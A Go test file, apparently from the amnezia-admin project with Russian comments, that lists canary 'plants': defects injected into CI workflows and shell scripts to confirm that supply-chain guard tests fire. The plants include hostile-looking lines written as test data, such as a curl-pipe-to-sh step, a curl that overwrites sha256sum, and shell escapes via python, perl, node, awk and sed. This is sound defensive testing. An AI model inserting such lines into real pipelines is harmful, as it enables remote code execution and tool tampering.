	// --- раунд 2: SEC-01 С-2 — состав .github ---
	{name: "wf-extra-file", extraFiles: []string{githubDir + "/workflows/evil.yml"},
		wantTest: "TestWorkflowFilesClosedList", wantMsg: "в .github/workflows лишний файл evil.yml"},
	{name: "wf-missing-file", hideFiles: []string{githubDir + "/workflows/ci.yml"},
		wantTest: "TestWorkflowFilesClosedList", wantMsg: "в .github/workflows нет ci.yml"},
	{name: "wf-actions-dir", extraFiles: []string{githubDir + "/actions"},
		wantTest: "TestWorkflowFilesClosedList", wantMsg: ".github/actions вне закрытого списка содержимого .github"},
	// --- раунд 2: QA-01 рек. 1 — eval / sh -c ---
	{name: "cs-eval", edits: sh(`eval "printf x | grep -q y"`),
		wantTest: progs, wantMsg: `программа «eval» вне закрытого списка`},
	{name: "cs-bash-c", edits: sh(`bash -c "printf x | grep -q y"`),
		wantTest: progs, wantMsg: "вызов оболочки «bash -c"},
	{name: "cs-sh-lc", edits: sh(`/bin/sh -lc "printf x | grep -q y"`),
		wantTest: progs, wantMsg: `программа «/bin/sh» вне закрытого списка`},
	{name: "cs-workflow-eval", edits: rel(`            grep -qE 'path[[:space:]]+amnezia-admin/cmd/cli' <<< "$info" ||`,
		`            eval "grep -qE 'path[[:space:]]+amnezia-admin/cmd/cli' <<< \"\$info\"" ||`),
		wantTest: progs, wantMsg: `программа «eval» вне закрытого списка`},
	// --- раунд 3: AU-LOGIC F1 — код в оболочку в обход лексера ---
	{name: "sc-heredoc", edits: sh("bash <<'E'\nprintf x | grep -q y\nE"),
		wantTest: progs, wantMsg: "вызов оболочки «bash» вне закрытого списка"},
	{name: "sc-herestring", edits: sh(`bash <<< "printf x | grep -q y"`),
		wantTest: progs, wantMsg: "вызов оболочки «bash» вне закрытого списка"},
	{name: "sc-source-procsub", edits: sh(`source <(printf 'printf x | grep -q y')`),
		wantTest: progs, wantMsg: `программа «source» вне закрытого списка`},
	{name: "sc-dot-stdin", edits: sh(`. /dev/stdin <<< "printf x | grep -q y"`),
		wantTest: progs, wantMsg: `программа «.» вне закрытого списка`},
	{name: "sc-bash-var", edits: sh(`"$BASH" -c "printf x | grep -q y"`),
		wantTest: progs, wantMsg: `в имени «"$BASH" -c`},
	{name: "sc-shell-var", edits: sh(`$SHELL -c "printf x | grep -q y"`),
		wantTest: progs, wantMsg: `в имени «$SHELL -c`},
	{name: "sc-allowed-redirected", edits: sh(`bash scripts/dev-tools.sh <<< x`),
		wantTest: progs, wantMsg: "вход оболочки перенаправлен «<<< x»"},
	{name: "sc-wrapped", edits: sh(`env bash scripts/dev-tools.sh`),
		wantTest: progs, wantMsg: `программа «env» вне закрытого списка`},
	{name: "sc-shell-arg", edits: sh(`find . -name x -exec sh {} +`),
		wantTest: progs, wantMsg: "оболочка «sh» аргументом"},
	// Воспроизведение аудитора на настоящей строке build-release.sh:55;
	// законный `| wc -l` держит счёт звеньев 30, как в аудите.
	{name: "sc-audit-line55", edits: []edit{{buildReleaseSH, "if printf '%s\\n' \"$deps\" | grep -E 'fakesrv|fakeserver'; then\n",
		"if bash <<'E'\nprintf '%s\\n' \"$deps\" | grep -qE 'fakesrv|fakeserver'\nE\nthen\nprintf x | wc -l\n"}},
		wantTest: progs, wantMsg: "вызов оболочки «bash» вне закрытого списка"},
	// --- раунд 4: AU-LOGIC R1 — "$1"/"$@" в позиции команды вне своего места ---
	{name: "r1-sh-run-line55", edits: []edit{{buildReleaseSH, "if printf '%s\\n' \"$deps\" | grep -E 'fakesrv|fakeserver'; then\n",
		"sh_run() { \"$1\" -c \"$2\"; }\nif sh_run \"bash\" \"set -o pipefail; printf '%s\\n' \\\"$deps\\\" | grep -qE 'fakesrv|fakeserver'\"\nthen\nprintf x | wc -l\n"}},
		wantTest: progs, wantMsg: `команда с подстановкой или кавычками в имени «"$1" -c "$2"»`},
	{name: "r1-set-dollar-at", edits: sh("set -- \"bash\" -c x\n\"$@\""),
		wantTest: progs, wantMsg: `команда с подстановкой или кавычками в имени «"$@"»`},
	{name: "r1-quoted-shell-arg", edits: sh(`printf '%s' "bash"`),
		wantTest: progs, wantMsg: `оболочка «"bash"» аргументом`},
	// --- A3б PR-2: исключение allowedPackageInstalls — только вызов целиком, ровно один раз ---
	{name: "a3b-install-extra-shell", edits: ci("          sudo apt-get install -y busybox\n", "          sudo apt-get install -y busybox sh\n"),
		wantTest: progs, wantMsg: "оболочка «busybox» аргументом в «sudo apt-get install -y busybox sh»", also: []string{tenv}},
	{name: "a3b-install-twice", edits: ci("          sudo apt-get install -y busybox\n", "          sudo apt-get install -y busybox\n          sudo apt-get install -y busybox\n"),
		wantTest: progs, wantMsg: "встречается 2 раз вместо одного", also: []string{tenv}},
	{name: "a3b-install-twice-release", edits: rel("          sudo apt-get install -y busybox\n", "          sudo apt-get install -y busybox\n          sudo apt-get install -y busybox\n"),
		wantTest: progs, wantMsg: "встречается 2 раз вместо одного", also: []string{tenv}},
	// --- инцидент v0.3.0-rc.1: окружение job test release.yml = job checks ci.yml ---
	{name: "rc1-shells-step-gone-release", edits: rel("        if: matrix.os == 'linux'\n        run: |\n          set -euo pipefail\n          sudo apt-get install -y busybox\n", "        run: echo нет\n"),
		wantTest: tenv, wantMsg: "release.yml test до go test нет шага установки busybox", also: []string{progs}},
	{name: "rc1-shells-gate-release", edits: rel("        if: matrix.os == 'linux'\n        run: |\n          set -euo pipefail\n          sudo apt-get install -y busybox\n", "        if: matrix.os == 'macos'\n        run: |\n          set -euo pipefail\n          sudo apt-get install -y busybox\n"),
		wantTest: tenv, wantMsg: "release.yml test до go test нет шага установки busybox"},
	{name: "rc1-env-step-extra-ci", edits: ci("          sudo apt-get install -y libgl1-mesa-dev xorg-dev\n", "          sudo apt-get install -y libgl1-mesa-dev xorg-dev libfoo-dev\n"),
		wantTest: tenv, wantMsg: "шаги job до go test разошлись"},
	// AU-LOGIC High-1: шаг busybox перенесён ПОСЛЕ go test — тесты снова идут без него.
	{name: "rc1-shells-after-gotest-release", edits: []edit{
		{releaseYML, "        if: matrix.os == 'linux'\n        run: |\n          set -euo pipefail\n          sudo apt-get install -y busybox\n", "        run: echo перенесено\n"},
		{releaseYML, "        run: go test -timeout=20m -race -count=1 ./core/ ./internal/... ./cmd/cli/ ./cmd/gui/\n", "        run: go test -timeout=20m -race -count=1 ./core/ ./internal/... ./cmd/cli/ ./cmd/gui/\n\n      - name: Оболочки для скрипта записи (busybox, dash)\n        if: matrix.os == 'linux'\n        run: |\n          set -euo pipefail\n          sudo apt-get install -y busybox\n"}},
		wantTest: tenv, wantMsg: "стоит ПОСЛЕ go test"},
	// лишний неустановочный шаг до go test только в одном файле
	{name: "rc1-extra-step-ci", edits: ci("      - name: go vet\n", "      - name: Лишний\n        run: echo x\n\n      - name: go vet\n"),
		wantTest: tenv, wantMsg: "шаги job до go test разошлись"},
	{name: "rc1-curl-sh-release", edits: rel("      - name: go vet\n", "      - name: Лишний\n        run: curl -fsSL https://example.invalid/x.sh | sh\n\n      - name: go vet\n"),
		wantTest: tenv, wantMsg: "шаги job до go test разошлись", also: []string{pipes, progs}},
	{name: "rc1-only-in-one-stale", edits: ci("      - name: Версии инструментов (раннер предъявляет себя)\n        # Оба ложных PASS", "      - name: Версии инструментов (2)\n        # Оба ложных PASS"),
		wantTest: tenv, wantMsg: "запись onlyInOne"},
	// QA-01 Н1: подмена утилиты загрузкой, под if, только в ci.yml — не
	// установка пакета, маркеры бы её не узнали; закрытый список шагов — узнаёт.
	{name: "rc1-qa-curl-tool-ci", edits: ci("      - name: go vet\n", "      - name: Подмена\n        if: matrix.os == 'linux'\n        run: curl -fsSL https://example.org/tool -o /usr/local/bin/sha256sum\n\n      - name: go vet\n"),
		wantTest: tenv, wantMsg: "шаги job до go test разошлись"},
	{name: "rc1-job-env-release", edits: rel("  test:\n    name: test (${{ matrix.os }})\n", "  test:\n    name: test (${{ matrix.os }})\n    env:\n      GOFLAGS: -mod=mod\n"),
		wantTest: tenv, wantMsg: "env: job", also: []string{goenv}},
	{name: "a3b-install-gone", edits: ci("          sudo apt-get install -y busybox\n", "          sudo apt-get install -y busybox-static\n"),
		wantTest: progs, wantMsg: "не встречается ни разу слово в слово", also: []string{tenv}},
	{name: "r1-dyn-place-moved", edits: rel(`              out="$("./$bin" version)"`, `              out="$("./$bin" version 2>&1)"`),
		wantTest: progs, wantMsg: `место allowedDynPlaces «../../.github/workflows/release.yml|out="$("./$bin" version)"|"./$bin"» встречается 0 раз`},
	// --- раунд 4: R2 — trap ---
	{name: "r2-trap", edits: sh(`trap "go version | grep -q go" EXIT`),
		wantTest: progs, wantMsg: "программа «trap» вне закрытого списка"},
	// --- раунд 4: R3 — интерпретаторы, оболочки вне списка, env -S, find -exec ---
	{name: "r3-python", edits: sh(`python3 -c 'import os; os.system("bash -c x")'`),
		wantTest: progs, wantMsg: "программа «python3» вне закрытого списка"},
	{name: "r3-perl", edits: sh(`perl -e 'system("bash","-c","x")'`),
		wantTest: progs, wantMsg: "программа «perl» вне закрытого списка"},
	{name: "r3-node", edits: sh(`node -e 'require("child_process").execSync("bash -c x")'`),
		wantTest: progs, wantMsg: "программа «node» вне закрытого списка"},
	{name: "r3-awk-system", edits: sh(`awk 'BEGIN{system("bash -c x")}'`),
		wantTest: progs, wantMsg: `вызов awk «awk 'BEGIN{system("bash -c x")}'»`},
	{name: "r3-env-S", edits: sh(`env -S "bash -c x"`),
		wantTest: progs, wantMsg: "программа «env» вне закрытого списка"},
	{name: "r3-find-exec", edits: sh(`find . -exec "bash" -c 'x' \;`),
		wantTest: progs, wantMsg: "программа «find» вне закрытого списка"},
	{name: "r3-ash", edits: sh(`ash -c x`),
		wantTest: progs, wantMsg: "программа «ash» вне закрытого списка"},
	{name: "r3-mksh", edits: sh(`mksh -c x`),
		wantTest: progs, wantMsg: "программа «mksh» вне закрытого списка"},
	// --- раунд 5: AU-LOGIC Q1, Q2 — тексты awk/sed только из закрытого списка ---
	{name: "q1-awk-print-pipe", edits: sh(`awk '{print "x" | c}' /dev/null`),
		wantTest: progs, wantMsg: `вызов awk «awk '{print "x" | c}' /dev/null»`},
	{name: "q2-sed-1e", edits: sh(`sed 1e /dev/null`),
		wantTest: progs, wantMsg: "вызов sed «sed 1e /dev/null»"},
	{name: "q2-sed-ge", edits: sh(`sed 's/x/y/ge' /dev/null`),
		wantTest: progs, wantMsg: "вызов sed «sed 's/x/y/ge' /dev/null»"},
	// --- раунд 6: AU-LOGIC S1 — весь вызов awk/sed, а не первый текст ---
	{name: "s1-sed-second-e", edits: sh(`sed -e 's/^/+/' -e 1e /dev/null`),
		wantTest: progs, wantMsg: "вызов sed «sed -e 's/^/+/' -e 1e /dev/null»"},
	{name: "s1-sed-expression", edits: sh(`sed --expression=1e /dev/null`),
		wantTest: progs, wantMsg: "вызов sed «sed --expression=1e /dev/null»"},
	{name: "s1-sed-f", edits: sh(`sed -fp.sed /dev/null`),
		wantTest: progs, wantMsg: "вызов sed «sed -fp.sed /dev/null»"},
	{name: "s1-awk-f", edits: sh(`awk -fp.awk /dev/null`),
		wantTest: progs, wantMsg: "вызов awk «awk -fp.awk /dev/null»"},
	{name: "s1-awk-source", edits: sh(`awk --source 'BEGIN{}' /dev/null`),
		wantTest: progs, wantMsg: "вызов awk «awk --source 'BEGIN{}' /dev/null»"},
	{name: "s1-extra-flag", edits: []edit{{devToolsSH, `awk '{print $1}'`, `awk -F ' ' '{print $1}'`}},
		wantTest: progs, wantMsg: "вызов awk «awk -F ' ' '{print $1}'»"},
	{name: "st-new-text", edits: sh(`sed 's/a/b/' /dev/null`),
		wantTest: progs, wantMsg: "вызов sed «sed 's/a/b/' /dev/null»"},
	{name: "st-dyn-text", edits: sh(`sed "$prog" /dev/null`),
		wantTest: progs, wantMsg: `вызов sed «sed "$prog" /dev/null»`},
	{name: "st-stale", edits: []edit{{historyKeysSH, `sed -n 's/^HEADERS //p'`, `sed 's/^/+/'`}},
		wantTest: progs, wantMsg: "из allowedToolCalls больше не встречается"},
	{name: "st-count-less", edits: []edit{{historyKeysSH, `sed -n 's/^HEADERS //p'`, `sed 's/^/+/'`}},
		wantTest: progs, wantMsg: "разных вызовов awk/sed найдено 5, ожидалось 6"},
	{name: "st-count-more", edits: sh(`sed 's/a/b/' /dev/null`),
		wantTest: progs, wantMsg: "разных вызовов awk/sed найдено 7, ожидалось 6"},
	// --- раунд 4: список программ не немой ---
	{name: "pg-stale", edits: []edit{{devToolsSH, `unzip -o -q "$archive"`, `tar -xf "$archive"`}},
		wantTest: progs, wantMsg: "программа «unzip» из allowedPrograms больше не встречается"},
	{name: "pg-count-less", edits: []edit{{devToolsSH, `unzip -o -q "$archive"`, `tar -xf "$archive"`}},
		wantTest: progs, wantMsg: "разных программ найдено 43, ожидалось 44"},
	{name: "pg-count-more", edits: sh("python3 --version"),
		wantTest: progs, wantMsg: "разных программ найдено 45, ожидалось 44"},
	// --- раунд 3: AU-LOGIC F2 — переопределение имени читателя ---
	{name: "fn-function-kw", edits: sh("function grep { head -n1; }"),
		wantTest: progs, wantMsg: `программа «function» вне закрытого списка`},
	{name: "fn-subshell-body", edits: sh("sort() ( head -n1 )"),
		wantTest: progs, wantMsg: "определение функции «sort» переопределяет имя"},
	{name: "fn-alias", edits: sh(`alias grep="grep -q"`),
		wantTest: progs, wantMsg: `программа «alias» вне закрытого списка`},
	// --- раунд 3: AU-LOGIC F3 — счёт uses: вниз (подмена != на > немая без неё) ---
	{name: "us-count-less", edits: rel("      - uses: actions/upload-artifact@", "      - x-uses: actions/upload-artifact@"),
		wantTest: usesT, also: []string{keys}, wantMsg: "ссылок uses: найдено 12, ожидалось 13"},
	// Счёт читателей вверх: законный `| wc -l` — без неё подмена != на <
	// немая (выборка раунда 3).
	{name: "cl-count-more", edits: sh("printf x | wc -l"),
		wantTest: pipes, wantMsg: "читателей конвейера найдено 31, ожидалось 30"},
	// --- раунд 3: AU-LOGIC F4 — чужой SHA под разрешённой парой ---
	{name: "us-zero-sha", edits: ci("      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0\n        with:",
		"      - uses: actions/setup-go@0000000000000000000000000000000000000000 # v7.0.0\n        with:"),
		wantTest: usesT, wantMsg: "не совпадает с закреплённым b7ad1dad31e06c5925ef5d2fc7ad053ef454303e для actions/setup-go — обновите таблицу"},
	// --- раунд 2: QA-01 п.2 — вердикт таблицы лексера доходит до go test ---
	{name: "tbl-wrong", parseRow: &parseCase{src: "a | grep -q y", want: ""},
		wantTest: "TestShellParserTable", wantMsg: "таблица лексера: \"a | grep -q y\" — читатели «grep», ждали «»"},
	{name: "tbl-unparsed", parseRow: &parseCase{src: "echo 'x", want: ""},
		wantTest: "TestShellParserTable", wantMsg: "таблица лексера: \"echo 'x\" не разобрано"},
	// --- долги CI: триггеры ---
	{name: "tr-dispatch", edits: rel("on:\n  push:\n", "on:\n  workflow_dispatch:\n  push:\n"),
		wantTest: trig, wantMsg: "release.yml: событие «workflow_dispatch» вне закрытого списка"},
	{name: "tr-call", edits: rel("on:\n  push:\n", "on:\n  workflow_call:\n  push:\n"),
		wantTest: trig, wantMsg: "release.yml: событие «workflow_call» вне закрытого списка"},
	{name: "tr-prt", edits: ci("on:\n  pull_request:\n", "on:\n  pull_request_target:\n  pull_request:\n"),
		wantTest: trig, wantMsg: "ci.yml: событие «pull_request_target» вне закрытого списка"},
	{name: "tr-tag-pattern", edits: rel("      - \"v*\"\n", "      - \"*\"\n"),
		wantTest: trig, wantMsg: "release.yml: событие «push»: настройка"},
	{name: "tr-release-branches", edits: rel("on:\n  push:\n", "on:\n  push:\n    branches: [main]\n"),
		wantTest: trig, wantMsg: "release.yml: событие «push»: настройка"},
	{name: "tr-ci-branches", edits: ci("    branches: [main]\n", "    branches: [main, dev]\n"),
		wantTest: trig, wantMsg: "ci.yml: событие «push»: настройка"},
	{name: "tr-missing", edits: ci("on:\n  pull_request:\n", "on:\n"),
		wantTest: trig, wantMsg: "ci.yml: нет события «pull_request»"},
	{name: "tr-form", edits: rel("on:\n  push:\n    tags:\n      - \"v*\"\n", "on: [push]\n"),
		wantTest: trig, wantMsg: "release.yml: `on:` не в форме словаря событий"},
	{name: "al-latest", edits: realWith(`@${ACTIONLINT_VERSION}"`, `@latest"`),
		wantTest: "TestActionlintVersionSingleSource", also: []string{"TestActionlintPinnedInEveryExpectedFile"},
		wantMsg: "версия actionlint «latest» вместо @${ACTIONLINT_VERSION}"},
	{name: "al-extra-file", edits: realWith(".github/workflows/ci.yml\n", ".github/workflows/ci.yml /dev/null\n"),
		wantTest: inv, wantMsg: "не ровно оба workflow"},
	{name: "al-real-gone", edits: ci(ciRealLint, ciLintEcho+strings.Replace(ciRealLint, ".github/workflows/release.yml \\\n            .github/workflows/ci.yml\n", "\"$canary\"\n", 1)),
		wantTest: inv, wantMsg: "нет ни одного вызова actionlint, в строке которого названы workflow"},
	// --- шаг и версия actionlint ---
	{name: "actionlint-step-coe", edits: ci("      - name: actionlint (оба workflow)\n", "      - name: actionlint (оба workflow)\n        continue-on-error: true\n"),
		wantTest: "TestActionlintPinnedInEveryExpectedFile", also: []string{keys}, wantMsg: "найден, но обеззублен"},
	{name: "actionlint-literal-pin", edits: rel("  test:\n", "  # go run github.com/rhysd/actionlint/cmd/actionlint@v1.7.11 .github/workflows/release.yml\n  test:\n"),
		wantTest: "TestActionlintVersionSingleSource", wantMsg: "версия actionlint «v1.7.11» вместо @${ACTIONLINT_VERSION}"},
	{name: "actionlint-env-override", edits: ci("      - name: actionlint (оба workflow)\n", "      - name: actionlint (оба workflow)\n        env:\n          ACTIONLINT_VERSION: v1.7.11\n"),
		wantTest: "TestActionlintVersionSingleSource", also: []string{goenv}, wantMsg: "переопределяет ACTIONLINT_VERSION"},
	// В шаге «Инструменты», а не в шаге разбора: там строка нарушила бы ещё
	// и закрытый список тела.
	{name: "actionlint-githubenv-override", edits: ci("        run: bash scripts/dev-tools.sh\n", "        run: |\n          bash scripts/dev-tools.sh\n          echo \"ACTIONLINT_VERSION=v1.7.11\" >> \"$GITHUB_ENV\"\n"),
		wantTest: "TestActionlintVersionSingleSource", also: []string{goenv}, wantMsg: "переопределяет ACTIONLINT_VERSION"},
	// --- матрицы ---
	{name: "checks-matrix", edits: ci("          - os: macos\n            runner: macos-26\n", "          - os: macos\n            runner: macos-15\n"),
		wantTest: "TestCIMatrixMatchesReleaseBuild", wantMsg: "матрицы ОС разошлись"},
	{name: "test-matrix", edits: rel("          - os: macos\n            runner: macos-26\n    steps:\n", "    steps:\n"),
		wantTest: "TestReleaseTestMatrixMatchesBuild", wantMsg: "матрица job test разошлась с job build"},
	{name: "arch-table", edits: rel("            runner: macos-26\n            arch: arm64\n", "            runner: macos-26\n            arch: amd64\n"),
		wantTest: "TestReleaseMatrixArchMatchesRunnerTable", wantMsg: "таблица runnerArch говорит arm64"},
	// --- шаг архитектуры ---
	{name: "arch-step-defanged", edits: rel(`test "$actual" = "$DECLARED_ARCH" ||`, `test -n "$actual" ||`),
		wantTest: arch, wantMsg: "RUNNER_ARCH=X64, matrix.arch=arm64: шаг прошёл"},
	{name: "arch-after-build", edits: rel("    steps:\n      - name: Архитектура раннера против matrix.arch\n",
		"    steps:\n      - name: Ранняя сборка\n        run: bash scripts/build-release.sh ${{ matrix.os }}\n      - name: Архитектура раннера против matrix.arch\n"),
		wantTest: arch, wantMsg: "обязан стоять ДО сборки"},
	{name: "arch-step-if", edits: rel("      - name: Архитектура раннера против matrix.arch\n", "      - name: Архитектура раннера против matrix.arch\n        if: matrix.os != 'nothing'\n"),
		wantTest: arch, wantMsg: "шаг сверки архитектуры обеззублен"},
	{name: "arch-declared", edits: rel("DECLARED_ARCH: ${{ matrix.arch }}", "DECLARED_ARCH: amd64"),
		wantTest: arch, wantMsg: "берёт DECLARED_ARCH не из matrix.arch"},
	{name: "arch-step-gone", edits: rel("        run: |\n          set -euo pipefail\n          case \"${RUNNER_ARCH:-}\" in\n",
		"        run: echo пропущено\n        x-old: |\n          set -euo pipefail\n          case \"${RUNNER_ARCH:-}\" in\n"),
		wantTest: arch, also: []string{keys}, wantMsg: "нет шага, читающего RUNNER_ARCH"},
	{name: "arch-case-positive", edits: rel("            ARM64) actual=arm64 ;;\n", "            ARM64) actual=arm64; exit 1 ;;\n"),
		wantTest: arch, wantMsg: "RUNNER_ARCH=ARM64, matrix.arch=arm64: шаг упал, а должен пройти"},
	{name: "arch-case-message", edits: rel("а matrix.arch объявляет $DECLARED_ARCH", "а в матрице $DECLARED_ARCH"),
		wantTest: arch, wantMsg: "в выводе нет «СТОП: раннер измерен как X64 (amd64), а matrix.arch объявляет arm64»"},
	// --- матрица и таблица меток ---
	{name: "arch-missing", edits: rel("            runner: macos-26\n            arch: arm64\n", "            runner: macos-26\n"),
		wantTest: "TestReleaseMatrixArchMatchesRunnerTable", wantMsg: "не содержит arch — сравнивать нечего"},
	{name: "runner-unknown", edits: []edit{
		{ciYML, "            runner: macos-26\n", "            runner: macos-27\n"},
		{releaseYML, "            runner: macos-26\n    steps:\n", "            runner: macos-27\n    steps:\n"},
		{releaseYML, "            runner: macos-26\n            arch: arm64\n", "            runner: macos-27\n            arch: arm64\n"}},
		wantTest: "TestReleaseMatrixArchMatchesRunnerTable", wantMsg: "метка раннера macos-27 не описана в таблице runnerArch"},
	// --- go test ---
	{name: "gotest-multiline-both", edits: []edit{
		{ciYML, "        run: go test -timeout=20m -race -count=1 ./core/ ./internal/... ./cmd/cli/ ./cmd/gui/\n",
			"        run: |\n          go test -timeout=20m -race -count=1 ./core/ ./internal/... ./cmd/cli/ ./cmd/gui/\n          echo ok\n"},
		{releaseYML, "        run: go test -timeout=20m -race -count=1 ./core/ ./internal/... ./cmd/cli/ ./cmd/gui/\n",
			"        run: |\n          go test -timeout=20m -race -count=1 ./core/ ./internal/... ./cmd/cli/ ./cmd/gui/\n          echo ok\n"}},
		wantTest: gtm, wantMsg: "после вызова стоит строка «echo ok»"},
	{name: "packages", edits: rel("./cmd/cli/ ./cmd/gui/\n", "./cmd/cli/\n"),
		wantTest: gtm, wantMsg: "списки go test разошлись", also: []string{tenv}},
	// -timeout (решение ядра 02.10, cmd/gui на macOS > 10 мин): значение
	// обязано совпадать в обоих файлах.
	{name: "timeout-differs", edits: rel("go test -timeout=20m -race", "go test -timeout=30m -race"),
		wantTest: gtm, wantMsg: "аргумент «-timeout=30m» вне закрытого списка", also: []string{tenv}},
	{name: "timeout-dropped-both", edits: []edit{
		{ciYML, "go test -timeout=20m -race", "go test -race"},
		{releaseYML, "go test -timeout=20m -race", "go test -race"}},
		wantTest: gtm, wantMsg: "нет обязательного флага -timeout=20m"},
	{name: "packages-order", edits: rel("-count=1 ./core/ ./internal/...", "-count=1 ./internal/... ./core/"),
		wantTest: gtm, wantMsg: "списки go test разошлись — на теге проверяется не то, что на PR", also: []string{tenv}},
	{name: "packages-dir", extraDir: "cmd/planted",
		wantTest: gtm, wantMsg: "каталог cmd/planted с тестами не входит"},
	{name: "gotest-if", edits: rel("      - name: go test -race\n", "      - name: go test -race\n        if: matrix.os == 'linux'\n"),
		wantTest: gtm, wantMsg: "шаг go test обеззублен", also: []string{tenv}},
	{name: "gotest-or-true-both", edits: []edit{
		{ciYML, "./cmd/cli/ ./cmd/gui/\n", "./cmd/cli/ ./cmd/gui/ || true\n"},
		{releaseYML, "./cmd/cli/ ./cmd/gui/\n", "./cmd/cli/ ./cmd/gui/ || true\n"}},
		wantTest: gtm, wantMsg: "после команды стоит «||»"},
	{name: "gotest-run-both", edits: []edit{
		{ciYML, "-count=1 ./core/", "-count=1 -run NOTHING ./core/"},
		{releaseYML, "-count=1 ./core/", "-count=1 -run NOTHING ./core/"}},
		wantTest: gtm, wantMsg: "аргумент «-run» вне закрытого списка"},
	{name: "gotest-list-both", edits: []edit{
		{ciYML, "-count=1 ./core/", "-count=1 -list . ./core/"},
		{releaseYML, "-count=1 ./core/", "-count=1 -list . ./core/"}},
		wantTest: gtm, wantMsg: "аргумент «-list» вне закрытого списка"},
	// --- аттестация ---
	{name: "attest-subjects", edits: rel("        dist/amnezia-admin-*\n        dist/SHA256SUMS\n", "        dist/amnezia-admin-*\n"),
		wantTest: att, wantMsg: "СТОП: субъектов аттестации 8, ожидалось 9"},
	{name: "attest-subject-path", edits: rel("subject-path: ${{ env.ATTEST_SUBJECTS }}", "subject-path: dist/amnezia-admin-*"),
		wantTest: att, wantMsg: "проверяется одно множество, подписывается другое"},
	{name: "attest-step-coe", edits: rel("      - name: Субъекты аттестации\n", "      - name: Субъекты аттестации\n        continue-on-error: true\n"),
		wantTest: att, also: []string{keys}, wantMsg: "шаг проверки субъектов обеззублен"},
	{name: "attest-positive-only", edits: rel("          done\n\n      - uses: actions/attest-build-provenance", "          done\n          exit 3\n\n      - uses: actions/attest-build-provenance"),
		wantTest: att, wantMsg: "на образце из девяти файлов шаг проверки субъектов не прошёл"},
	{name: "attest-extra-loop", edits: rel(`          all=(dist/*)
          for f in "${all[@]}"; do
            in_subjects "$f" || { echo "СТОП: $f публикуется, но не входит в субъекты аттестации" >&2; exit 1; }
          done
`, ""),
		wantTest: att, wantMsg: "образец «лишний файл»: шаг проверки субъектов обязан упасть"},
	// Весь блок env: job release переименован (x-env: YAML не читает), а не
	// одно имя: переименованное имя попало бы под закрытый список имён.
	{name: "attest-env-gone", edits: rel("    env:\n      # Множество субъектов аттестации", "    x-env:\n      # Множество субъектов аттестации"),
		wantTest: att, also: []string{keys}, wantMsg: "нет env ATTEST_SUBJECTS"},
	{name: "attest-check-gone", edits: rel("        run: |\n          set -euo pipefail\n          shopt -s nullglob\n          subjects=()\n",
		"        run: echo пропущено\n        x-old: |\n          set -euo pipefail\n          shopt -s nullglob\n          subjects=()\n"),
		// Тело шага с `sort -u | wc -l` уходит в x-old: читателей конвейера
		// становится на два меньше, и точный счёт TestNoEarlyExitPipeReader
		// обязан это заметить — поэтому pipes в also.
		wantTest: att, also: []string{progs, keys, pipes}, wantMsg: "не найдены шаги: сумм №"},
	{name: "attest-order", edits: []edit{
		{releaseYML, "        run: cd dist && sha256sum amnezia-admin-* > SHA256SUMS\n", "        run: echo суммы-позже\n"},
		{releaseYML, "\n      - uses: actions/attest-build-provenance", "\n      - name: Суммы поздно\n        run: cd dist && sha256sum amnezia-admin-* > SHA256SUMS\n\n      - uses: actions/attest-build-provenance"}},
		wantTest: att, wantMsg: "порядок шагов нарушен"},
	// --- persist-credentials ---
	{name: "persist-release", edits: rel("          # git fetch ниже идёт по публичному репозиторию.\n          persist-credentials: false\n", "          # git fetch ниже идёт по публичному репозиторию.\n"),
		wantTest: "TestCheckoutsDoNotPersistCredentials", wantMsg: "(job release) checkout шагом №1 без persist-credentials: false"},
	{name: "persist-ci-lint", edits: ci("          persist-credentials: false\n\n      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0\n        with:",
		"\n      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0\n        with:"),
		wantTest: "TestCheckoutsDoNotPersistCredentials", wantMsg: "(job lint) checkout шагом №1 без persist-credentials: false"},
}

// mainTests — все сторожа пакета. Чистый прогон обязан показать PASS
// каждого: иначе фильтр мог ничего не найти, и «провал» значил бы не то.
var mainTests = []string{
	"TestActionlintInvocationMeaning",
	"TestActionlintPinnedInEveryExpectedFile",
	"TestActionlintVersionSingleSource",
	"TestCIMatrixMatchesReleaseBuild",
	"TestCheckoutsDoNotPersistCredentials",
	"TestGoTestPackagesMatch",
	"TestTestJobEnvironmentMatches",
	"TestNoEarlyExitPipeReader",
	"TestNoToolEnvironmentOverrides",
	"TestReleaseAttestsChecksums",
	"TestReleaseMatrixArchMatchesRunnerTable",
	"TestReleaseRunnerArchStep",
	"TestReleaseTestMatrixMatchesBuild",
	"TestShellcheckCanaryStepLogic",
	"TestWorkflowKeysClosedList",
	"TestActionsPinnedBySHA",
	"TestWorkflowTriggersClosedList",
	"TestWorkflowFilesClosedList",
	"TestShellParserTable",
	"TestCommandProgramsClosedList",
	"TestDatadirguardCanary",
}

func activePlant(t *testing.T) *plant {
	t.Helper()
	name := os.Getenv(plantEnv)
	if name == "" || name == "нет" {
		return nil
	}
	for i := range plants {
		if plants[i].name == name {
			return &plants[i]
		}
	}
	t.Fatalf("неизвестная подсадка %s=%q", plantEnv, name)
	return nil
}

// readSource — ЕДИНСТВЕННАЯ точка чтения файлов сторожами пакета. В
// дочернем процессе канарейки сюда подсаживается дефект; подсадка, которая
// не легла (нет ровно одного вхождения), роняет процесс — иначе канарейка
// проверяла бы нетронутый файл.
func readSource(t *testing.T, path string) []byte {
	t.Helper()
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("не прочитать %s: %v", path, err)
	}
	p := activePlant(t)
	if p == nil {
		return data
	}
	text := strings.ReplaceAll(string(data), "\r\n", "\n")
	for _, e := range p.edits {
		if e.path != path {
			continue
		}
		if n := strings.Count(text, e.old); n != 1 {
			t.Fatalf("ПОДСАДКА %s НЕ ЛЕГЛА: в %s %d вхождений подменяемого текста вместо одного", p.name, path, n)
		}
		text = strings.Replace(text, e.old, e.new, 1)
	}
	return []byte(text)
}

// plantedTestDir — каталог с тестами, который подсадка добавляет к
// результату обхода репозитория (см. TestGoTestPackagesMatch).
func plantedTestDir(t *testing.T) string {
	t.Helper()
	if p := activePlant(t); p != nil {
		return p.extraDir
	}
	return ""
}

// plantedHiddenFiles — файлы, которые подсадка убирает из обхода .github.
func plantedHiddenFiles(t *testing.T) []string {
	t.Helper()
	if p := activePlant(t); p != nil {
		return p.hideFiles
	}
	return nil
}

// plantedExtraFiles — файлы, которые подсадка добавляет к результату обхода
// .github (см. TestWorkflowFilesClosedList).
